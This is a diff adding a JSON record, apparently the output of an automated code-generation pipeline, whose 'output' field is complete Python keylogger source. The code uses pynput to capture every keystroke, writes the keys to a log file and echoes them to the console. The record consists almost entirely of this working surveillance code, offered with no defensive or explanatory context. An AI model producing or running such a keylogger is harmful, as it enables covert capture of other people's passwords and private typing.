@@ -1,0 +1,6 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\ndef on_press(key):\n    try:\n        k = key.char\n    except AttributeError:\n        k = f'[{key.name.upper()}]'\n    with open('keylogs.txt', 'a') as log_file:\n        log_file.write(k)\n    print(f'Key pressed: {k}')\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        return False\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
+  "notes": "Generated initial code",
+  "applied_fixes": [],
+  "iterations": 1
+}
